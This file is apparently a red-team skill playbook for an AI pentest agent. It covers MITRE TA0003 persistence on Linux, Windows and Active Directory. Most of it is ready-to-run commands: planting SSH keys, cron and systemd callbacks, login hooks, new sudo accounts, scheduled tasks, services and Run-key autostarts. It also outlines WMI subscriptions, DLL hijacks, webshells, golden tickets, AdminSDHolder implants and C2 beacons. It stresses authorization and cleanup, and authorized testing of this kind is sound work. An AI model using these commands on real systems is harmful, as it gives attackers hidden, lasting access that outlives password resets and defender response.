---
name: Persistence and Maintaining Access
description: Establish durable, authorized access that survives reboots and credential rotation across Linux, Windows, and Active Directory — tracked for clean removal at engagement end.
tags: [post-exploitation, persistence, maintaining-access, mitre-ta0003, redteam]
recommended_tools: [execute_command, run_in_session, netexec_scan, metasploit_run]
vuln_classes: []
domain: post-exploitation
phase: persistence
---
# Persistence and Maintaining Access

MITRE ATT&CK **TA0003**. Goal: keep a reliable way back in after reboots, dropped sessions, and
password rotation, so the engagement continues without re-exploiting.

> **AUTHORIZATION + CLEANUP**: only install persistence when the Rules of Engagement allow it.
> **Log every mechanism** (host, path, artifact, timestamp) so it is removed at engagement end.
> Prefer the least-invasive, most-reversible option. PROOF of persistence = a fresh
> connection/callback obtained AFTER a reboot or a new session.

Decision order (quiet → loud): **reuse creds/keys → user-level autostart → service/task →
privileged mechanism → AD-level**. Stop at the lowest level that meets the objective.

## Linux

### SSH keys — cleanest, most reversible
```
echo '<PUBKEY>' >> ~/.ssh/authorized_keys        # per-user (or /root/.ssh if root)
ssh -i <KEY> <USER>@<TARGET>                      # PROOF: key login, no password
```

### Scheduled execution — survives reboot
```
(crontab -l 2>/dev/null; echo '@reboot <CALLBACK>') | crontab -    # user cron
echo '* * * * * root <CALLBACK>' > /etc/cron.d/<name>              # root cron if writable
# systemd: <name>.service + <name>.timer in /etc/systemd/system; systemctl enable --now <name>.timer
```
PROOF: callback fires on schedule / after reboot.

### Login & service hooks
```
echo '<CALLBACK>' >> /etc/profile.d/<name>.sh     # runs on interactive login
# also: writable systemd/init unit ExecStart, /etc/rc.local, shell rc files
```

### Account layer — privileged, record carefully
```
useradd -m -s /bin/bash -G sudo <USER> && echo '<USER>:<PASS>' | chpasswd   # new sudo user
```
PAM / nsswitch / SUID backdoors are high-impact and hard to spot — use only with explicit RoE and
detailed logging. PROOF: the account authenticates after a reboot.

### Web persistence
A webshell in the docroot survives service restarts. Record the path; remove at cleanup.
PROOF: shell reachable after the app restarts.

## Windows

### Scheduled tasks & services — survive reboot (admin for SYSTEM)
```
schtasks /create /tn <NAME> /tr "<CALLBACK>" /sc onlogon /ru SYSTEM    # onlogon/onstart/minute
sc.exe create <NAME> binPath= "<CALLBACK>" start= auto && sc start <NAME>
```
PROOF: callback after reboot/logon.

### Registry autostart — user-level, no admin
```
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NAME> /d "<CALLBACK>" /f
# also HKLM\...\Run (admin), Winlogon Userinit/Shell, Startup folder .lnk
```

### Fileless / stealth (admin)
- **WMI event subscription**: `__EventFilter` + `CommandLineEventConsumer` + binding — fires on a
  system event (logon, uptime threshold). PROOF: callback with no on-disk autostart entry.
- **DLL search-order / COM hijack**: plant a DLL where a trusted binary loads it. Note the exact
  path/CLSID for removal.
- **Accessibility swap** (sethc.exe/utilman.exe) needs authorization — it exposes a pre-auth shell.

## Active Directory (domain-level — strongest, highest impact)

With domain compromise, persistence lives in the directory itself. All of these require explicit
RoE and must be documented for remediation (they typically survive a single DC restore):
- **Golden ticket** (forge TGT with the `krbtgt` hash) / **silver ticket** (service-scoped TGS).
- **DCSync-backed** account whose hash you hold; **AdminSDHolder** ACL implant → re-grants rights.
- **DSRM** password abuse; **Shadow Credentials** (msDS-KeyCredentialLink) on a target account.
PROOF: obtain a valid Kerberos ticket / authenticate as the principal after defenders reset the
originally-compromised account.

## Cross-cutting
- New privileged **accounts** and added **SSH/API keys** are simple and durable — always logged.
- A **C2 beacon** with jittered check-in is persistence + channel; ensure it is RoE-approved.

## Cleanup checklist (run at engagement end)
Remove every dropped key/account/task/service/unit/registry-value/webshell/ticket you recorded;
confirm each is gone; report the full list in the findings so the client can verify.
